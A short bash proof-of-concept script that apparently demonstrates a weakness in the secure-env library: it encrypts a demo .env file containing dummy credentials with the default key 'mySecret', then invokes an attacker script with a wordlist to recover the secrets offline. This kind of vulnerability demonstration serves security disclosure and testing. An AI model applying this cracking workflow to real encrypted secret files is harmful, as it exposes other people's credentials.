#!/usr/bin/env bash
# SaltlessEnv — encrypt a demo .env with the real secure-env (default key), then
# recover the secrets offline from the .env.enc alone.
set -euo pipefail
cd "$(dirname "$0")"
printf 'DB_PASSWORD=sup3rs3cret\nAPI_KEY=EXAMPLE-not-a-real-key-0000\n' > demo.env
echo "=== victim: secure-env encrypts demo.env (no -s => default key 'mySecret') ==="
node victim_encrypt.js demo.env demo.env.enc
echo
echo "=== attacker: only has demo.env.enc, recovers the secrets offline ==="
node attacker_crack.js demo.env.enc wordlist wordlist.txt
